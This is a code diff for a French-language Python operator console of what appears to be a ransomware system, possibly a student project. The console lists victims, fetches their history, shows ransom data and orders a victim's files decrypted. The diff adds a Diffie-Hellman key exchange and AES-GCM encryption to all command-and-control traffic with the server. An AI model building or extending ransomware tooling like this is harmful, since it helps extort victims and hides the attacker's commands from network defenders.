@@ -1,8 +1,9 @@
 from utile import network as net
 from utile import message as mess
-
+from utile import security as secu
 # Connexion au serveur
-serv, gp = net.connect_to_serv()
+conn, gp = net.connect_to_serv()
+key = secu.Diffie_Hellman_exchange_key(conn, gp)
 
 #----------------------------------------------------------
 def choix_victime(liste_victime):
@@ -88,7 +89,9 @@ def afficher_rancon_victime(data_victimes):
                     if choix == 'O':
 
                         # Envoie au serveur la requête de l'historique d'une victime
-                        net.send_message(serv, mess.set_message('CHANGE_STATE', [victime['VICTIM'], 'DECRYPT']))
+                        packet = mess.set_message('CHANGE_STATE', [victime['VICTIM'], 'DECRYPT'])
+                        packet = secu.AES_GCM_encrypt(packet, key)
+                        net.send_message(conn, packet)
 
                         print("La demande est transmise !")
                         temp2 = False
@@ -122,11 +125,14 @@ if __name__ == "__main__":
             # On change la valeur de la variable puisque l'utilisateur a fait le premier choix
             ordre_choix = True
             # Envoie au serveur la requête de liste des victimes
-            net.send_message(serv, mess.set_message('LIST_VICTIMS_REQ'))
+            packet = mess.set_message('LIST_VICTIMS_REQ')
+            packet = secu.AES_GCM_encrypt(packet, key)
+            net.send_message(conn, packet)
 
             # Boucle qui ajoute les victimes dans la liste "liste_victimes"
             while temp:
-                ligne_victime = net.receive_message(serv)
+                ligne_victime = net.receive_message(conn)
+                ligne_victime = secu.AES_GCM_decrypt(ligne_victime, key)
                 if mess.get_message_type(ligne_victime) == 'LIST_VICTIM_RESP':
                     liste_victime.append(ligne_victime)
                     continue
@@ -147,12 +153,15 @@ if __name__ == "__main__":
                 id_victime = [num_victime]
 
                 # Envoie au serveur la requête de l'historique d'une victime
-                net.send_message(serv, mess.set_message('HISTORY_REQ', id_victime))
+                packet = mess.set_message('HISTORY_REQ', id_victime)
+                packet = secu.AES_GCM_encrypt(packet, key)
+                net.send_message(conn, packet)
                 # Je réinitialise la variable temp au cas où elle serait toujours False du choix précédent
                 temp = True
 
                 while temp:
-                    ligne_historique = net.receive_message(serv)
+                    ligne_historique = net.receive_message(conn)
+                    ligne_historique = secu.AES_GCM_decrypt(ligne_historique, key)
                     if mess.get_message_type(ligne_historique) == 'HISTORY_RESP':
                         historique_victime.append(ligne_historique)
                         continue
